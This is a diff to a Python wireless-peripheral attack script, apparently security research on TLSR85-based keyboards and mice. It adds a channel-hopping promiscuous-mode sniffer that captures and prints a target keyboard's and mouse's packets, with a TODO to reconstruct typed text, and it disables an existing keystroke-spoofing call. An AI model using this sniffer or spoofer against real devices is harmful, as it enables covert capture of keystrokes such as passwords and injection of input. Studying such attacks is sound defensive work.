@@ -10,6 +10,7 @@ from binascii import unhexlify
 from lib import common
 from devices.TLSR85.tlsr85 import Tlsr85
 from devices.TLSR85.tlsr85_keyboard import *
+from devices.TLSR85.tlsr85_mouse import *
 
 
 common.init_args('./tlsr85-spoofing.py')
@@ -31,6 +32,52 @@ def spoof(attack, address, preamble, channels, rate):
                     time.sleep(0.0001)
 
 
+def sniff(keyboard, mouse):
+    dwell = 200
+    dwell_time = dwell / 1000
+
+    channels = keyboard.CHANNELS
+    byte_base_address = unhexlify(keyboard.base_address.replace(':', ''))
+    byte_keyboard_address = unhexlify(keyboard.keyboard_address.replace(':', ''))
+    byte_mouse_address = unhexlify(mouse.mouse_address.replace(':', ''))
+
+    channel_index = 0
+    common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
+    common.radio.enter_promiscuous_mode_generic(unhexlify(keyboard.base_address.replace(':', '')), rate=keyboard.RATE)
+
+    entered_string = ""
+    last_tune = time.time()
+
+
+    while True:
+        # Increment the channel after dwell_time
+        if len(channels) > 1 and time.time() - last_tune > dwell_time:
+            channel_index = (channel_index + 1) % (len(channels))
+            common.radio.set_channel(channels[channel_index])
+            last_tune = time.time()
+
+        value = common.radio.receive_payload()
+        if len(value) >= keyboard.BASE_ADDRESS_LENGTH:
+            found_base_address = bytes(value[:keyboard.BASE_ADDRESS_LENGTH])
+            if found_base_address == byte_base_address:    
+                found_specific_address = bytes(value[keyboard.BASE_ADDRESS_LENGTH:keyboard.FULL_ADDRESS_LENGTH])
+
+                if found_specific_address == byte_keyboard_address and len(value) >= keyboard.packet_size:
+                    packet = keyboard.parse_packet(bytes(value))
+                    if keyboard.check_crc(packet["crc"], packet["payload"]):
+                        print(f"Keyboard packet\tCHANNEL:{channels[channel_index]}")
+                        print(packet)
+                        # TODO put what's inside the packet in the entered_string variable and display it
+                        last_tune = time.time()
+                
+                elif found_specific_address == byte_mouse_address:
+                    # TODO fix CRC error
+                    packet = mouse.parse_packet(bytes(value))
+                    if mouse.check_crc(packet["crc"], packet["payload"]):
+                        print(f"Mouse packet\tCHANNEL : {channels[channel_index]}\n")
+                        print(packet)
+                        # TODO display the action of mouse
+                        last_tune = time.time() 
 
 
 trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24bf, 2)
@@ -57,4 +104,9 @@ address = unhexlify(trust_keyboard.base_address.replace(':', ''))
 preamble = unhexlify(trust_keyboard.preamble.replace(':', ''))
 
 
-spoof(attack, address, preamble, trust_keyboard.CHANNELS, trust_keyboard.RATE)
+# spoof(attack, address, preamble, trust_keyboard.CHANNELS, trust_keyboard.RATE)
+
+trust_mouse = Tlsr85Mouse("4a:b4:cb", "dc", "aa:aa:b5", 30, 0x11021, 0x24bf, 2)
+
+sniff(trust_keyboard, trust_mouse)
+
